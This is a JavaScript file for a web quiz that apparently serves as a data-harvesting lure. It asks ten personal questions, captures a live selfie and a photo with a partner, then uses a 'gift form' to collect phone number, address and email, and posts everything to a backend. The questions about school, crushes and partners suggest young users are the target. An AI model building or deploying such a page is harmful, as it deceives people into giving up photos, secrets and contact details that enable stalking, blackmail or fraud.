// Questions Configuration
const questions = [
    {
        id: 1,
        question: "What is your favorite food? 🍕🍔",
        type: "text",
        placeholder: "Tell us your favorite food!"
    },
    {
        id: 2,
        question: "What is your boyfriend/girlfriend's name? 💖",
        type: "text",
        placeholder: "Type their name..."
    },
    {
        id: 3,
        question: "Upload a selfie right now! (Camera opens automatically) 🤳",
        type: "camera",
        placeholder: "Click to take a selfie!"
    },
    {
        id: 4,
        question: "Upload a selfie with your boyfriend! 🤳💑",
        type: "upload",
        placeholder: "Choose a picture from gallery"
    },
    {
        id: 5,
        question: "Who in your school loved you the most? 😏",
        type: "text",
        placeholder: "Who was it? Tell us!"
    },
    {
        id: 6,
        question: "Which friend annoys you the most? 😤",
        type: "text",
        placeholder: "Be honest! 😂"
    },
    {
        id: 7,
        question: "What is your weirdest habit? 😜",
        type: "text",
        placeholder: "We all have weird habits!"
    },
    {
        id: 8,
        question: "Which place do you most want to visit in your life with your love? ❤️🌍",
        type: "text",
        placeholder: "Dream destination with your love..."
    },
    {
        id: 9,
        question: "If your boyfriend didn't marry you, which person would you choose instead? 😜💔",
        type: "text",
        placeholder: "Plan B? 😏"
    },
    {
        id: 10,
        question: "What's the most embarrassing thing your love ever did? 😳💘",
        type: "text",
        placeholder: "Spill the tea! ☕"
    }
];

// Playful messages after each answer
const playfulMessages = [
    "Awesome! 🎉 Let's keep going!",
    "Haha, that's hilarious! 😂",
    "OMG, I love it! 💕",
    "You're doing great! ⭐",
    "That's so cool! 🔥",
    "Interesting! Tell me more... 🤔",
    "Wow, didn't expect that! 😮",
    "You're the best! 🌟",
    "This is getting good! 🎊",
    "Almost there! You're amazing! 🎈"
];

// Store answers
let answers = {};
let currentQuestionIndex = 0;
let cameraStream = null;

// Start the quiz
function startQuiz() {
    document.getElementById('welcome-screen').classList.remove('active');
    document.getElementById('questions-screen').classList.add('active');
    showQuestion(currentQuestionIndex);
}

// Show current question
function showQuestion(index) {
    const question = questions[index];
    const container = document.getElementById('question-container');
    
    // Update progress
    const progress = ((index + 1) / questions.length) * 100;
    document.getElementById('progress').style.width = progress + '%';
    document.getElementById('current-q').textContent = index + 1;
    
    // Clear previous content
    container.innerHTML = '';
    
    // Create question HTML
    const questionDiv = document.createElement('div');
    questionDiv.innerHTML = `<div class="question">${question.question}</div>`;
    
    if (question.type === 'text') {
        questionDiv.innerHTML += `
            <input type="text" 
                   id="answer-${question.id}" 
                   placeholder="${question.placeholder}"
                   value="${answers[question.id] || ''}"
                   onkeypress="handleEnter(event)">
        `;
    } else if (question.type === 'camera') {
        questionDiv.innerHTML += `
            <div class="image-upload-container">
                <button class="camera-btn" onclick="openCamera(${question.id})">📸 Open Camera</button>
                <div id="camera-preview-${question.id}"></div>
            </div>
        `;
    } else if (question.type === 'upload') {
        questionDiv.innerHTML += `
            <div class="image-upload-container">
                <input type="file" id="file-${question.id}" accept="image/*" onchange="handleFileUpload(${question.id})">
                <label for="file-${question.id}" class="upload-btn">📁 Choose Photo</label>
                <div id="upload-preview-${question.id}"></div>
            </div>
        `;
    }
    
    container.appendChild(questionDiv);
    
    // Focus on text input if applicable
    if (question.type === 'text') {
        setTimeout(() => {
            document.getElementById(`answer-${question.id}`).focus();
        }, 100);
    }
}

// Handle Enter key press
function handleEnter(event) {
    if (event.key === 'Enter') {
        nextQuestion();
    }
}

// Open Camera
async function openCamera(questionId) {
    try {
        const video = document.getElementById('camera-video');
        const previewDiv = document.getElementById(`camera-preview-${questionId}`);
        
        // Request camera access
        cameraStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' },
            audio: false 
        });
        
        video.srcObject = cameraStream;
        video.style.display = 'block';
        
        // Show video in preview area
        previewDiv.innerHTML = '';
        previewDiv.appendChild(video);
        
        // Add capture button
        const captureBtn = document.createElement('button');
        captureBtn.className = 'camera-btn';
        captureBtn.textContent = '📸 Capture Photo';
        captureBtn.onclick = () => capturePhoto(questionId);
        previewDiv.appendChild(captureBtn);
        
    } catch (error) {
        alert('Camera access denied or not available. Please allow camera access or upload a photo instead! 📸');
        console.error('Camera error:', error);
    }
}

// Capture Photo
function capturePhoto(questionId) {
    const video = document.getElementById('camera-video');
    const canvas = document.getElementById('camera-canvas');
    const previewDiv = document.getElementById(`camera-preview-${questionId}`);
    
    // Set canvas size to video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Draw video frame to canvas
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    // Convert to image
    const imageData = canvas.toDataURL('image/jpeg');
    
    // Stop camera
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
    
    // Hide video
    video.style.display = 'none';
    
    // Show captured image
    previewDiv.innerHTML = `
        <img src="${imageData}" class="image-preview" alt="Captured selfie">
        <br>
        <button class="camera-btn" onclick="openCamera(${questionId})">📸 Retake</button>
    `;
    
    // Store answer
    answers[questionId] = imageData;
}

// Handle File Upload
function handleFileUpload(questionId) {
    const fileInput = document.getElementById(`file-${questionId}`);
    const previewDiv = document.getElementById(`upload-preview-${questionId}`);
    const file = fileInput.files[0];
    
    if (file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            const imageData = e.target.result;
            
            // Show preview
            previewDiv.innerHTML = `
                <img src="${imageData}" class="image-preview" alt="Uploaded photo">
            `;
            
            // Store answer
            answers[questionId] = imageData;
        };
        reader.readAsDataURL(file);
    }
}

// Next Question
function nextQuestion() {
    const currentQuestion = questions[currentQuestionIndex];
    
    // Validate answer
    if (currentQuestion.type === 'text') {
        const input = document.getElementById(`answer-${currentQuestion.id}`);
        if (!input.value.trim()) {
            alert('Please answer the question before moving on! 😊');
            return;
        }
        answers[currentQuestion.id] = input.value.trim();
    } else if ((currentQuestion.type === 'camera' || currentQuestion.type === 'upload') && !answers[currentQuestion.id]) {
        alert('Please upload or capture a photo before moving on! 📸');
        return;
    }
    
    // Show playful message
    showPlayfulMessage(playfulMessages[currentQuestionIndex]);
    
    // Move to next question or show form
    currentQuestionIndex++;
    
    setTimeout(() => {
        document.getElementById('playful-message').textContent = '';
        
        if (currentQuestionIndex < questions.length) {
            showQuestion(currentQuestionIndex);
        } else {
            // Stop any running camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            
            // Show gift form
            document.getElementById('questions-screen').classList.remove('active');
            document.getElementById('gift-form-screen').classList.add('active');
        }
    }, 1500);
}

// Show Playful Message
function showPlayfulMessage(message) {
    const messageDiv = document.getElementById('playful-message');
    messageDiv.textContent = message;
}

// Handle Gift Form Submission
document.getElementById('gift-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = {
        phone: document.getElementById('phone').value,
        address: document.getElementById('address').value,
        email: document.getElementById('email').value,
        answers: answers,
        timestamp: new Date().toISOString()
    };
    
    // Save data securely (localStorage for demo - in production, send to server)
    saveDataSecurely(formData);
    
    // Show thank you screen
    document.getElementById('gift-form-screen').classList.remove('active');
    document.getElementById('thankyou-screen').classList.add('active');
});

// Save Data Securely
async function saveDataSecurely(data) {
    try {
        // Send to backend server
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Data saved successfully to database!');
        } else {
            console.error('❌ Error saving data:', result.message);
            // Fallback to localStorage
            saveToLocalStorage(data);
        }
        
    } catch (error) {
        console.error('❌ Network error, saving locally:', error);
        // Fallback to localStorage if server is unreachable
        saveToLocalStorage(data);
    }
}

// Fallback: Save to localStorage
function saveToLocalStorage(data) {
    try {
        const existingData = JSON.parse(localStorage.getItem('giftSubmissions') || '[]');
        existingData.push(data);
        localStorage.setItem('giftSubmissions', JSON.stringify(existingData));
        console.log('💾 Data saved to local storage (fallback)');
    } catch (error) {
        console.error('Error saving to localStorage:', error);
    }
}

// Cleanup camera on page unload
window.addEventListener('beforeunload', function() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
    }
});
